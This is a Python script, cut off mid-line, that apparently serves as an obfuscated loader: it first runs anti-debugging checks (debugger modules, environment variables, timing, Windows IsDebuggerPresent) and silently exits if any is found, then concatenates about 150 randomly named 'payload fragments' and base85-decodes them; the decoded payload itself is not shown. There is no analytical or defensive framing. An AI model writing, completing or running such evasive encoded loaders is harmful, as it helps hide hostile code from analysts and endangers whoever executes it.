#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_ca8c6Diir77rHP = '4k>!#l+Y8P?$i?F&IYNEs0#TF1!vzCnX*T~@b<RuCA*zsozU(x5<yxt==|$5BRr=5+%x5DZi'
_cf1wOOyCdIIBvT = 'QhH2(mri7J3x=*Mz<WKM3eHE=4yrWzqL*;VAeh?k>IfDIfhHl*zp}XEsli%@k|*{V&QR+gH$'
_ckkRstdz8xwUrG = 'C^sW9qpKR-7T;$TVBzos3xX1In-n&UEO7J;@2ex&jfXZW{qr}L2JNpyXqrh7`Ot2!eP-@ZUl'
_croCs7HTtvg0vk = '2g`7u1x8z(ntEk)TJmyIk`!nYeE5K@G%^qmdYH!In?3^Vqk5$2Efa@chNdYZxbNVYdS>VIy1'
_cdw99yBWq11sny = 'S9Lud%m`~~m!8Ddb4i!8uKnv;>)JVJGJVh>gSG6N0BW7aZfiM=k^+zSq8mmT_;9?q1j_g(o3'
_cag2evCt8XSmKi = '0@%I84}h}tp~U(Z;KE6vcg-*$6H!o~QBT;QT22fN+kl1AW+##DGr=!boBU{kJP-$FHUY;6A3'
_cobRoiIlBaSLbl = 'dOF5^({jz2Yb65HQlbzUIE{<g56pO`!{+)K8BhYos6+*v+iVG8CAk2kz%F$JIpWSE7fuSgmo'
_co9fRDHD2GTQ63 = ';o4J0s_6)R~jmD4}DP>pI)quG151kY1@_+tE%nQtoid$i#4jISvO+pnIEbRJRdjH9S39s75f'
_cnnBPiuD8drsKx = '$p(W!gX9ci!;drvI~%jISp>N+4>=8r{nSwHaZ4vU;k=PS=EKVwTAY%k_xam%p+jx4HmbGJ!&'
_croBrq0GqMCFOa = 'w|JfKtRR!n?7pFre(k4ag10162X+sw+K_O2-?<#nCnR063>OPiM$;02Qw$kPA1C84mR5Q0<C'
_coLPI9x_DcISXU = 'kJH^5#+Rzhgd`K=JZC!6z6L$ws%!bd*<XyV%}o{4J6$(F+4*}gqRzbDz_ma~$qmh>4Xr-@g9'
_cxwcEQ_IoaUkP7 = 'LKsmqvQ7$r}{%627Ekp9%2zaAY1?;M=K@G@+Fy<479%yzPDDS*1HJU5w5}mqpmlMN`7EzDyC'
_chWVFhXTVgSwj3 = 'Z=VlfR3MlUJpkNipNWqOF)Clv|&sa&(@Jszih8;>?69G?t$?o2_n1nhr2awjSFAd=Wu=p)+1'
_cjS1Ldga6mKpWm = 'U_(aVS}PS5{1@JNszQ+5mPUSYOxn-Hm=5lVs!iVh@7%&K?jqZ#2(F0Yn5f!x49@j_soCNsKt'
_cv9FsoRNZRE4BI = 'vfHf7{a<Tq1OD5f|dc3xvy;?U00_>$c-t^Zo_h<`_NrCLf094dN!c|k_}St+Z)2CS#6{S0_e'
_cuvwGljI5gpjlA = 'JEW&S2V1->Mdf1-bUt>JC$KVJBJwGeD)D3A<_u`_3K3It$c!FpkX+k!FwX{>&J@H0x{58sp5'
_cmRVaafsA7mqw_ = '-D+&y<NqFaN4VJCeAOA9N5F>9yEf&p2`aiL&&Vjhl0}=Bu5A8@POX1{#nZCvC(I(2I?u@fhO'
_ciGNLN8pHqKSdX = 'Ay?|V<3wy##_y=(-Oj-Mbak5l4VqfWlN3r3%oti|XS<|jn`O7`aLngJ-!*VhPQrx5o4{XzH)'
_ckWpXWQRGswNNs = 'cmkmuq)Oiz9}fB1tenYhYo6Xz3=#;@Ni`U4{8AMc>p0amI^Z*iEhw-g2I<V$6TC{Yk+jkP3t'
_ciF9Oxc0yYny6T = '4F91Td4yYzrTVg2G2`=t@o?)B`K+2y}KPs`xi>n4=_VD9{^nPccOc+^5gOec+TDs8ee1}KcD'
_cbdtIVQKlaDX3N = 'B0xnYpGxv{uO^t6=Tr9gt7qhI$H%SEe5p|&$Z;zk>{$T_kVQb7#x1WXt5?am2PQu#+vkN&G>'
_c_2NAe4tOyCz__ = '17O8lZ9G0fhXnHZMT#7}`I;rf&OV<#C?Irs#p3&Q{R+lY}bFZHe6bKSY?P<CTK~&&ThjrZU3'
_chRgVIr8oqqJNg = 'Lanhnk<sG?*bgtx9_d6pkkSb-V9z;HL`^q7tWfG!#s)9DdKlG?IN9TmF{;g7hN3p}iTUi<ff'
_cpblp3m3aza7dK = 'Np{IA?{X@!$?VXbXjYRDGCVMyf|V^_k~)bsn-vG|KCdxSq1zP^l|&^1ZQHj|M|E{qR>O1qZa'
_cmMbG5COg8m5z0 = 'Y($Z&%YT1j#&#TNfQ$2b<&s_=--vYt>s3lc|pWh)bgWvU3NTwMnlj@&Y=^%R&!Z$~JH*}(*F'
_cz2UnSRyTSbKrO = 'TV6VO$xVm$vL9V7o3}!=N@LXK*vlUV#Ty(0LV*3Y`O5qN1d0`!h(vA>UYarFSOzX<Q!PXNyy'
_cw2rmba3cIUVCu = 'B<kdfk2Aj#^a$?e4M9t2)N+aS7%G84o;mS>k9n6=Nl?nL&O6pQLa-w7U8oD#}AAZsBWEow1I'
_cmXuvB5sKmha9Y = '!+W)EYjM)~AarzQ+IZ1d+#(Nlyk1#W>K6x9f2y1frbc<YM&)+}SaIs-iA##tq-&AuS>L~KOw'
_chnDSwrX60HK4F = 'Z+fbM&`Az1W%?!G_NOA-v`_Qm}+a={@2`^1ZE0e{-dN81$mr~?=z@I#*ljRWW{1F6Tx0hgUp'
_cnU2E5wbUbmS6z = 'Q-xHUlkm95JrIg6#FS>H8kyQqWsVd{$hx&(Bj16%a&Oih)upd(`&R-YLRUFlbwz5g0_NzM+$'
_crSYAB_mrYuTSX = '7f66cpJeSj)}eyR6ZP5~E6`0gZ%EvfX%43^IX>!2mLMo!Tvt4Q6IuPS%fjf*bO-{U&;^e+ew'
_cq4hxVIFy77GdY = 'xu8RzH876rkXgJelII4($$u*bA!G%8>3e7*=FNT??HpRyrGi4d|5pZwRa{PFiw1(oN9&FYby'
_cgpGsgUBlTLA2L = '|4e20WpOU$5W4)o>u}XkNi&_$!pj+iV+DomM^kj0^kgiuWj^xSuPEARamrr+AX0cD}xVbss6'
_ci_DuVdHDM2asj = 'B)#wu@mpUnkV?l>vOh!W1&V=KF#&P!LPn-_sS!Oou6kSI&dVZRs`lKMy%;_hHr<>)X}u=+}='
_cyyiUWbnqyO_Sy = 'S$4!^MLN3ts*>{ravK^Yj=iDQ$=Hp6w)Arf!Vc-7o%CUy|v&`k1!oK&GtoL~xNc00W%z0784'
_cerM10ICPGBdLr = '0HL7?=Md*?X7ieMp~y=Huw}hq=HwD`(6zHm^g4t*mLmi!QU)jo9GvF)>lD}!BVk~Oa;PUI=J'
_cnVbyJr1QNY1lg = 'Z}TOhjdZF(Q`39vos3DEzDx^i2U#msY2BiRr4kKSkWmf83fD?p$f9!NFmmk;DI?doasA1sHR'
_cuQ9y6boY3sgxn = '59N){T0N5A=Kyy-G6_eo#3_xKt|0d8ugM_>#xL6|6mdhV#A?(%u9s_-}_bwo0P5kfisNbtzW'
_cp6jjsctAheYjw = 'i;CbGWG`(9bFk0p|F_R(>S0D>Z-&DAM$3+F&on~H<-#zXUjeFV705H3$Jy9Z-!AJ-}F9$h!U'
_cuGvTF3RDOIq5Q = 'KleueNd<`=2syeu1*GFr(mMgNM@|4~MPGdS!fIFn&Pe1o$=zx4_^vEZ7yr1^Iw{>9oS0Cunf'
_cierU5bcKkn5uL = '*($g9HGxgxh~_yzw6XB1e_^_+5TJW*(RuE)B&wTYU%{_{%<P1Ej8K+$7P2|S6-?*8oR>tH4m'
_cuFB6Yu3NLW5n0 = '?%ET(j=IG<Qc)g)d13zcpdg!2ts+=~FV<`jJ&oa1a(F#r?)+*m&O2Or}UA@SD<J%=+d*CAFk'
_cjZ6oV33XB7q2t = 'U<=SGZ{8l6=n%quz{oGT^T6Y+t?X#M;23Lsqc62y~<W(!X#%6w<KdK+t8)!vjNJnLd9J|V@D'
_ccHjKwqOekrsDn = 'dINIGzFQa!Ykb_Jq<pZPreiB-$re%1v{;!-RA`|8P`L3@vuHBHI3*>hc`RVieJRicGF4AmPw'
_ccuFTQiTZ9HNFB = '|kC-`%rrpCS6^I7}2=4_>~Gf6c6>4!z6(*z_Wmp9Epv`@zQEJ~7V-XW3^Ia&-jC}P^eNBhEY'
_cvXvFFY5SfsuSF = 'ivy1TmFuec_h#T8|AdMw;a9A50>?S=_AI@Y4yDXDfpLkJ$xc%gG2*8X`^91pU5iY0iKONm>B'
_clAlBBVRuEg7pG = '|vK9w1`i4^O4ROEHrPgqV)v|2-b7rRg#$h)LimfP>Rb&FfN21Qzz=si|Xh=43#2ITecDTZ98'
_cyNmp4lu0T7KZ4 = 'KfSE#E@*XDyV@`;gG^+0mTZ)kUhu>3}%+h0w53D%fb^hLVV6=D7N*vUu=ym7q+Bsy-4K;gr6'
_clUsP0CgFlsIC3 = ';m4Uex|9f*y*5%4vR)|8;Q?-XcI3dEKd7sK5z=6GzlM>?fAz{REcHCVPVDx;Xq)BmyI<~6M4'
_cnJcFHtlZgLLgZ = '*&OmHyk<_GZ^LSPZ=7WuYFL%abg`S@$YXm0%TA{xv=SVC*a_pUOu5L)=d(+|i*TcC2p=Vl;)'
_ce_xCFNh8PScVX = 'zgA3L$z`pOFwBG`8!LP*<251g&At{XKYspK03qzN@!SIqE_rst_n`u}SW5TIpyghEf@zzzf3'
_cdaIVB3cu2BvBF = '!d|!7sLsb%rv!ry>>6A>x$;$SX$IoDz+$GVGLee6#SFtE5qrJZ0cB?>sstY7hdzVVCuL`Z^3'
_cwvEXXl1yAA8Kg = 'v>Z1*0g6I~l>JM@ix!N%`;5A0^6Nl=ND;?)4qRdn8F1XAeuJLr`x(B`{&WdxmiFulqUA|3np'
_cnbMNlJ0fy238a = '3I5$j`=R$K5Q{{Icab}1LL1-ZjND&_=AnSd(w5{8LQbym+C)m=z3O#F~V`#m6geGb6-o`6gY'
_cc2ZSvEDrzCkJs = '!dh{RRcK2z#sP)X6HuG64oRoEytkx@bgROq*G&kUy1FvVVRU8P4~t@-NL=94X-QP&b-d4+Gd'
_ch8_ezoeYBQOoI = '<az@qqw&Tl!xhC6Isacg&bXBuHQ_`o=+iC?r2MAinoD(eaxR>ZT}bEpBSUuCkOb89)zKt^eO'
_ckUozqquXiifxP = 'XHm8jZZpZ}g~$NF}duuEz9b?6XW>CuTQdze&&cp%q=D<+t&v%vg1lQRtjXtL#IJCzxz%s&P|'
_cyB3j8NIWcfZUV = 'iod3;}wp~^Fm)HUw?`AXcB)K9t4n}qK_)+8id0k(qrke~xn47xdaj0X^;ElZZo3ZFo=vcK>g'
_cwMwCwd6RN22Hx = 's#D+oRni%{1_+5KDVdebG?$t*Pl5>9{Q3(ZTkS0Q+V1$L(*z%(%oMJp^VKMs(6Y#@6M54>ab'
_ckEkzQno01WrD8 = '}2;&U~|fc(cv9Yq?~^VL8=5><Kx4M)pxc0zxUC^ya{AjyVTn*OhHvf&COfll0v>~FT;J~WUW'
_c_F5lTv51em1Sl = 'kw|`5c#2Y60Oe?moB`s`fBufnh75KNmsV<CfeS(-daRl~Q3EW~j|_DJ;GX^0IHXrTAgVAuVd'
_cae9CFsPDlPjid = '4S~s!<6X+gx9Kjp}F}p{Vq(b&GF0<iRY$S0mnJ-+~)Hhex+DwP?o<$MjZ%7bZSwDhTIdh|l='
_ctIq1L_bGh5wAi = 'RyCFb~7@&T>GsqXceKri_98<y|Ahp0tLSeKJ#a>N&H;AV1@t;FW`J3;hDs=32tG=)ODg`S~8'
_cdkdvlEyuJ3GeA = '|A}W*@$!*F#_qP(xUR*aHdPNgR&6u1z==cnXZa}Mzo_IT1P#kuv86vBt_!Zoj{_PvWl8*vS)'
_cjFtgXUAUNKRv5 = '>8O<j|J>Yao~3qCncyUfm7L}LkP22CPbbBw&T#KMS>>|u=BKe{;6o2n*9Kp;-ji)<-u`{0Yh'
_crsAkR1z06YPh0 = 'pUUxN3YdvQ{O7srX_FV8KJL`|3HG%>U{ctxt&*9QixbQm=0a8pW8=h1rB#Vix!r@bU00ptcT'
_cwuDsMzA7wpSZz = '&Px)w@eL!{+uBo37!hc%mWY7hP#nAb2D^xO%J=Le^r%rem)t+9E6Rcq#HMb<rw0bIz=RU!m*'
_cpZn9QHN2Qs6_P = 'nHoPP)qPoI(z2T+}^IiwqC=`}1)c|*y9$r>6i;s>>vb{?a;;j3`H$t||!Rp3U6+Rc>5E#Xf1'
_ccV3RSqvGfq2Ii = 'C;Xac@y9M5(qTVed=Oiq7bfXM4HjUDd<`L!&8H*PHC-^y=nD%^w0zU6R==)Zxwvkin#4hOOK'
_cnKUUe4zbkzFsz = 'MP0r<)GqGVn)9}YE4zg2ekQ?rTnVG(|@E^^kbWLvNMf{79Orq4ELfofHkw%0xyc!KEthOh0s'
_cnlIfd0dVWTisa = '0{qA<&#&&A*ux1vO?Z6ND=UPccCknIW0>QHgBqeZ<lxa(%c*8hSaOr3<r~X!1w>H!&4!1EPO'
_cjigtVx1Csd7D7 = 'au%W9d$Ciu1S!1Mvp=`W2JQT>>9Dg)BrbU+?J8PV8MONB&=Ew){>_qLq)k<|wFnJN~S(zEB}'
_cpIz6QAMkUY16U = 'rU|19q(-~2v)zeH)OWZUcIRtqa;7>y51KUTC!VpZ!%Rl?Dll0&MtDe&%$LEAzQF4fI7wf{?H'
_cm1Ey4ZtHYAKCj = 'f*5W)AWLM?|=CI;U@JX*fqk;=+*;l;zoxuL|_AoCS7en?9pdoyz@-Vt_y5|lh%fi+AR#!J-f'
_cjjMK1ad8FHHR0 = 'jk#Epr9&ZroIpN;?ULc!A)nBcU~Vz=~AN@zmy__71yChe`{_NUmb53MbhLk8+2F-)+k!dyP*'
_clTPq6VHTaZZI0 = 'IHm|+B0`Ff59l|3tWMc+qsO{kUP<`wv39#hsbmS^>%onZnb&d**qJM_OW8L}{g8ai&GKo?2`'
_cwe7TOCcxtbMbn = 'qEPGw)*K=6IZnmUqf1-;J3Tbe-FqMeRWdaUy|oiaoHxG|xtK6!{0hX3(=<yUg+;7v^<RNY19'
_cbko16QUKJpDDr = '*QB!KeLx0dX7+S!24{AuSriSesL|DPRGfUw?!Hq*uu=tz(_4QS2H4qvirG+2=VV;R1?Yfybr'
_cc1NRQ0R4whvTj = 's}FE@p%wlK&d066iI~4AINbc`Y$5dDW=aSJMEZ|noipdM?6&em9p`QM4S&1UxGSsI5^bp>*E'
_cbBr_WW9EQFhzy = '5b$T_lDO#1oLN%*iJ9}y`5?UZ$;v;L2jCd7Tvg8w#nmbA*^x<jYEvCVC<PKUrWX+tz+;i|U)'
_cmWyx5ojylcf9e = 'NvA%C$%V;h`gTsLsOfL~>&WxakEbI0Zy<d9EqSxcyv@gQ7>qn(KFpI+d%sVkWlUHT)Zx!nWA'
_cxPDLAjGB02qhw = 'ALBX76T7XGcV6;Sp9s{~xVivl=WDe~>hHCo&7{T*lP|l|f*}S(g~;Y$3sY>yndlnPm8=pQC-'
_cbauQ3EMMUQl3D = 'n%df(wp;Ws*>+e(=5|4AJ?q1Aw(pXtZ<InuCe+RQS{rGGwJ0F^V!zkpbWCeQk0wCGOw)mL;d'
_cyydxrCz3g4fZi = 'EB9_uFN1;vdQ!=I%tjr&HNj4@!eK_3O(suvO6PbycT@ry@aq|uEX1x3>2eFsWeD*Z-6u>Ap&'
_cgmpGh1NQsDFkq = 'Hi1fu=XJMMU;z#~Pqvl^`a|2=FnaC1Rh6ifp3bf1Y7ZP+wNTa|?}u{~5$X<tT_eCRX0%Xjch'
_cgWhZ5R7GkkmEJ = 'uYIXJrUdRamf<{gJtt-depfl6z}h_)nt(zrZ0R<^?Q?<Z{jrE}n54`Z1B`8ro9iX&9g`yKle'
_ctjHuDc9nkkaob = 'UX$dPgdP&O8bg@#wO{7(`@Ju*HtU-ouYH4*5e7^8m$)W8TRCT%1;(U;-*!MrVY^D@BS^Hln4'
_cp23dKsHCBOjBo = '?kiE|YoF`N+k!Sxuc8r%Aci^g|j}t3q;pvUWYQ|^@D^|ie?HEb_G9_NPleh{8uDBE%NQee_D'
_czq481jXmjiSb3 = 'j2&_7o1*zTYv2-HjKrpGLDupF!4rlbnvLoC5*c!iw$hF(VBhbeIKpc)Z}26hP+j`GlV~o4bq'
_cir3UW_kinnYOs = '$`5)=(V-czxfT`){mnKo#JDT<;#-G-z;i4|<|;{&p=+~alB9gL!-pNY^b99gUDL=SxBR>+>O'
_cxOuFfKN7H3S7R = 'GLK~q^SQG#$Pb^<r-y7=9pW27@S6jpKLL+4{ccEAF*Y+v$tz-}?o>$LF#UA@9|nQcK+%+^%O'
_caLyMhDlBhrDYX = 'xH?$>@+lkELlb{**_<_72)|8casT^b0n%%}>&pJCD9%=*czM7}m=$A?o05-wCea#@9R>GQ4P'
_czhCdhIy8BITBf = 'Jnm?+LxM=)9Zu7C0FsgTaHP%N>S*e|^BlNAwB$_<JjilewxoB1owy7Rq&0kT{&-ZfNNS(HM^'
_cvHZ6_fOypSmut = '!?wnK&ik18TA5P>)aq6p`H_Z4!byqzEU%U%LhJ3klW15UbH7^<>M##vEj(<%gMz8q*w1(*<Z'
_cd2ropy4LY9SKH = 'dsKZ+-I`!E3E-a%eLY<Pv7kgQlY3+!V!!Mizn(G2r-&>XGzgtFUr+JPWr@GqOOJ(+9lS>|SU'
_cneNGr3IzlnpHB = 'ksb34XdLvBhQE#e*1PCy7p@}Ww7AMJD(Fc!NWD^V4A{s!)zOQV+w;pvuj-J<P5A>9057b-@?'
_capnn0KAAOrCQh = 'D{hc0T{8diIsoP8;SYGommf;7YuM(M*QD+_lsAE3!`Pck!&KkUPciII~*d562-2{D|aO+Q;q'
_clhES7TcYQsAOX = 'EqR7FLlr7HNz5O=u%J@-Yy`x_6vaL33UYa+XXf9esHtb!?K7%W;FLPvOLplsvw)PreayIMnH'
_caMd4dUzqspZAd = '|Gm2PJsV{YhGka=3Rev&AaF$?8GRo%rOP)h6S{@0P=b3_i9j5b9l@{U1R7R0vkn-1oxTnq@k'
_cxhRHiXg7N620D = 'p&xqt)CAInL|qIF-6HJ#$YE78g9QY=dUu0+)mamcwp#YC=x8GQyMBiuMtb(U?5;f@BMv0qR&'
_caiqMWIUby9hfd = '2nSiW8tBA7%n^2lFLGawAr8s}YQ=5Q&`!Eo3&IKwZmmMHF&RZ89LDi$0UA)uV|fV~Y@?lE86'
_cgKo2VvkqL9kuz = '7TKsO*~w6@KagYgEoC%3rbqiAGA!FZFJBQpJgTBbdZ)V%@gdwrtpva2tq@XRwxnMa#V!drb;'
_crn2mkzzxo2UU5 = '%9D@J7rMoC{1)9tpU<{zgi&H~$Yw<BTg!fNyXnDwrsz@4X<lzL{dEm)yM9&s%vPF=PpaGIBD'
_cjpkpUq7GzPgb9 = 'th0bGXDfH5!Zq5)Aw$h-`i?5Da+UhO%N!|wvkatE8j9)WL!0TLXH>@Ba%g&k*u7>`s8N-J(J'
_cryQpXPsFQrNSJ = '<VU0j2g(`2J1kP4@c8WM)DA@OoUe@Z~0ehiWSE0hbZNijt+W&vk0fSZ)5EAo983tUL0Z!&hQ'
_cxUbO7qL4fLW_2 = '`TnPa1*wU1&@UqVhZH7jQ^Uq4u!8t+M1ai<c|Y?MfZR*_9@>Fz327?;mW_@D_he;Mr4M#>JE'
_ctuLvEIPsojtvz = '`aAPk|>WrgjCFAtSt((OONwsnrtPYI%3)KYQ4%U?n>*Yp1+8!K@mZ?=KA%>}=JW&H9Zj_@9O'
_cmcIPcOOqF2Kvg = '$R_p8j@P7!M(gamQ0gpM`nM@Bm64(~Z9`s?Oy3$a6B61Mf0yq@alkG&Sd4Vl2Ssl&Wo%CTAs'
_ciESoE78hu4ejW = 'dJ0nf<n<YsQC#8`mhaiSF&wCfUj~b1#2k}f?KEwa=eDog7;Xu1U9s2g}rmeRZQAv?Nowp1}b'
_cwijbv5a4l5uRA = '05Psx49>G}B_tA}Xp5H`{!i*j^}_ijf0C=OV5d$a0uoN<a_JN_IIFCQ2GDgQ$GO|?09P$|Uo'
_coelZ0bLh_y3wT = ';e@oM=Clkh#(a1BAJ0Ce$5vcW_|l&Q9@-OJZm4^|LCU@lrWyPx5dy-L69|I25E#DBVc}GJmz'
_coV5QozyW4tPxx = 'x*0N1P&nHSdk~bb-#n-SIjYj)xWmES-%V0&y%>aL9*nuQUqvsG7DOne;k#%WWC_BWnl1R?eJ'
_cdSlaI3jwz73ZH = 'l+IppTfryspDttVN_o8eWx}ucDY@#4?P9B;rW=zmC)H(*$1$aIhrh)3XO6!iIk-&SS0OPd$b'
_chTScTkoEZ0l1Z = 'd3jIWsM2@^^}bk6W!o`GNGe}HR8>$aj$_$0;BTc!lFTQy3U2l+e{=h>7%+clqAo0EmgG8Pzd'
_cetLDeBkbXN30H = 'r^MvaX%G|R>;51)N%IL2&=E9X$?GcPltlk$JPqM%9j0)i<Zq0tI#@EV-mTWQF%H0~v2rx4HY'
_cnOSaSG8WZYEXh = '@HGwu&)glH5@CIob6&hU2g|#4=r`dy0$Bs{j;hb^dxE0>N$8>%+UQKoWe5Ice@i4OD#=4~`2'
_cxVQ5gQWOZVMKr = 'o531c+x~X@cls#`nI|1-9nwfspYGQ+-h6uXsqPu%LAe#wSWPNQGoXK2!S&*eZ82ecW~;KicZ'
_c_UYUnvMuvQNVs = 'B$Z2+U=O_%e6M<X_IkrO2z#UR8Lh8Y}Ua881n9B@tG;MQasR>s{nXT7MP4YiiPt@2kFJdZW*'
_chfbbzZnQLg8Ng = 'C(stDH>uKx<o_sSmegg=Khu(IPsRtm1J)$=&<#MaAsp#gY(6<<fQGy)+RZF$?cPrg8H`77qt'
_cgSZrSiMjsAR0o = 'H0Ya3&1WXdt^P&5@&87htv+b3{4$;#ny3vOQ3X{AE5!HtP^J!<AJ^nKOVisBYN7s&qIt`QU@'
_coGC_kiP9lhbrN = '_W*Q89PmmuEYWIi!QNikaN&?i#a_0A({@J<(n|G1UekslQdaA03au?zc6uhczeWj14Kf*@Mc'
_comxtqYCEYLc0W = '&Nh4~LgJu~O5-WL2U1xa$;rgo|H?$pz!wxsK)&_@Fiv%88;p+kVU98Prm(ErLtq*9Wf?OaGT'
_czOotq4T5GMwEH = 'f3OJa8`h<EvMLY77WK#A1V=ERlQ_p`Qf#Ykz<{03G*%Ly$=Hr4;J@{IG)~1KPvBJwBaTk)6@'
_cuPQsm00VugFxw = 'KOU5T7e1B$@Uav(rR@;B8&1MgFy%=<u4wEEdrPgER0W?YU(W-JDY?mYXIX1`PG5$h}m&eDQs'
_cqqFbZm9S1uVco = '!_=$=f5j#6fEe!-&uu8hS62p6$`Wy(khg7`X{5`}%ddTQK#sOD;T;WP7*gm12zg%`o<nDcC-'
_chFsJnYupYXMKB = '{*AKc5G?d&J5OWQIYdHihsGWePZ9{iQ2W<-2xsuk0NdiRC1eZ@l4>?yq5}LO)_2r+(=l02L2'
_cmKORfVGMwGOlA = '55dExse;uQ-2i$V&AWqmBI2%k1j7p3gNI){vbucGwIBWD*EUO|nqQu5`Kb_Im3Lv=bn~f|cP'
_cbTqGSK1qa3xSP = 'NVAktqch;jYa0PUNGMb<<zBud2c3<i`QG)|d@|modRyvg8blaDR6nL4xp9}Q0?9$W^+%<nJV'
_cfAlR5iTZZmLFo = '$53X$VzCvWV%{VJZM9845kvdNpnuy=3>#m^c?N6Wzr9=rK?OBW^9#gaRBO5?qytV?%J&~WkL'
_cmwwGNiL7QHn8o = 't-7!5ccD9&OV#B@zu6GL?x;<^gS!U>Vd?~aQxPYYDN>7#*-pYowjPg2+ocRDT0F0iWvtZpO4'
_cvKIa3Hgn6GXYP = 'J5qDG8+AJcUAJf}us;;h^EAW$!AsG1UiA4bVyu_#$V#)5EC;15o^5Y!NK+(%gYp9%fl+aH3>'
_cgHUU4ImKu5uWV = '@ouKujAgv$$D2lIipMO7t(~TLs{_o`dRHw-&lh=qDi<jSmr*n(}x!YkQ%pjSQ`q0rOEH7#)k'
_cx8S_GbNS6VlSG = 'hfC4QR4*j}3GsvNoRou^w?K~P+7RJ@G_npuNZrJM{@>A|&^!kU80eDfs8J+h(NP1r!-PY^i^'
_cd2z1KRa0u_hce = 'Pl@IOnUY>tUlRvc<AV+PfR<-VbY+2E7@T`P(tHid!c8!`*8j55uixiF47Q-8%h<=UiWIH`o1'
_cvZRMyxwVCl30V = 'E+LH{uqbTfh8=FIxfF0R7r|GklgWRIcxp4$<|;u?Mw7;gc6JNlTH(QsjQjpkN&!xv3q{Ats|'
_crLND6Uurn8yCM = 'xKB9HQ3=XHC?5AcJvFJ~VgqLh9oqD2ZGB#;|MAgK+)CXI17|&|O>Om<d|b?ma(C=0Ve7&4n%'
_cnv5Cy6ijzElh4 = 'uO*WY?b3YX+2g&+OVGbrbQi@0hcZs{>*#<JsuW1Qco%#f}`qI1c0=dD*mxRKUOsgD=ijio-8'
_cy9ktxCWEVGC2A = 'X@==H2c{f<NvdPU3Bg>Nc1+i0|l*yC|-SS?{i8}y~GUe{+N%!icg{9NN^TrE48D0@#Vvb9h!'
_cx1N1U1Ig0XEwp = 's7PV-c%GBG$F1W-G<tC<m@C{Cg^%Y3>6EzGlkrT<o+;!gee&y9Ze1Dw<BNFl3mNTr1a4hz#)'
_cjGh5gz6Cpgvw7 = '_^0H0`3%P#;diR|qy^yF5!b;9LMlr&E-S@0ER1zdX>jPobKq5%aPu7?fiYSka~>NW)prOTs*'
_ciAd8pvH8c3V1O = '&3#u1y*m(Hb;8XJ1}zisUQ)3Pwy)Ug%}MEY%kT%a?qwHcU#vC!ukvsQvT_R=oy=}}+)hs3)g'
_cc5LJYWoyyBMHL = 'Es$6PIp^X7C)O*t54{D@Xanu?1E;BQq<oQw4xhRl?F>RUK1_72@+l$?J4_3mD=?A;wQyWZp#'
_cyFo1zri2tLXPI = 'SlD7+E3HYON_y+)9p|v9joVw+WdB$ToP%GOI7^nCIQFPjsf(%;ZtP4prUBxO7;+hL@#xw`*F'
_cjy_049M2GRaBy = 'eC!J#5s~IJ19^Q)k@FO^DMdsh~*Y#ieZX=So;?x7=x-{BjD9&+po%p?)cQzrR4P%V;$cmp~J'
_cdYeezOVdZ8l4D = 'XAbDtmROrV~g3S_HG#;y==ZW5!-iLsX@;T)mY8{YG_ATV=fb0bf!hJc%V={`9d)f>E&)!Y<8'
_cd3xqvqatHWLVf = 'ro2ifiSW`&qQerq?jz7KZNV4Z?`M~i#u;GdH^gqh>XoPuW4r-tga#+ny1nqwAp_-8q^a*WTY'
_cti9EzzDCxtL0D = 'Xa8BIvF%go~~iI+ud9ComA&4=jdBp|80VILf<-BY?S|M+06Wsi9x3Fvlk_zI+Eu2s9%Ae8$|'
_cyCwUzqcHqhmxq = 'B?{?R!Bn(nWME!;oRh_U*jmJrHdh0CXcF;oMU`@J_y!rDV&tW8cow>d}@;hVUq}1+E5vkh&S'
_cvKu4kK4dCKiwG = '}zpK!|+yfdicqbzJUc(TG(B6{mu+|?qD1PyYT0SG?ebFTT>H<exgUxN!$WzZK+q5j=_Q^4#@'
_cdSSMnOxMbMh0R = '7JemFe$^vy5%jbIZ!_nFYd*G+Ct=^|^W<FMD}`mLqn90w?54Y@~`rQI`OHYskcj=;o}_T_#t'
_cv57gNC3aaWcHj = 'vMd28%$Oe(BUWiSujW-UWh)zOaiV+NiS)+EEgS'

_pbrwEbaiMmdEW1 = __import__('base64').b85decode(_ca8c6Diir77rHP + _cf1wOOyCdIIBvT + _ckkRstdz8xwUrG + _croCs7HTtvg0vk + _cdw99yBWq11sny + _cag2evCt8XSmKi + _cobRoiIlBaSLbl + _co9fRDHD2GTQ63 + _cnnBPiuD8drsKx + _croBrq0GqMCFOa + _coLPI9x_DcISXU + _cxwcEQ_IoaUkP7 + _chWVFhXTVgSwj3 + _cjS1Ldga6mKpWm + _cv9FsoRNZRE4BI + _cuvwGljI5gpjlA + _cmRVaafsA7mqw_ + _ciGNLN8pHqKSdX + _ckWpXWQRGswNNs + _ciF9Oxc0yYny6T + _cbdtIVQKlaDX3N + _c_2NAe4tOyCz__ + _chRgVIr8oqqJNg + _cpblp3m3aza7dK + _cmMbG5COg8m5z0 + _cz2UnSRyTSbKrO + _cw2rmba3cIUVCu + _cmXuvB5sKmha9Y + _chnDSwrX60HK4F + _cnU2E5wbUbmS6z + _crSYAB_mrYuTSX + _cq4hxVIFy77GdY + _cgpGsgUBlTLA2L + _ci_DuVdHDM2asj + _cyyiUWbnqyO_Sy + _cerM10ICPGBdLr + _cnVbyJr1QNY1lg + _cuQ9y6boY3sgxn + _cp6jjsctAheYjw + _cuGvTF3RDOIq5Q + _cierU5bcKkn5uL + _cuFB6Yu3NLW5n0 + _cjZ6oV33XB7q2t + _ccHjKwqOekrsDn + _ccuFTQiTZ9HNFB + _cvXvFFY5SfsuSF + _clAlBBVRuEg7pG + 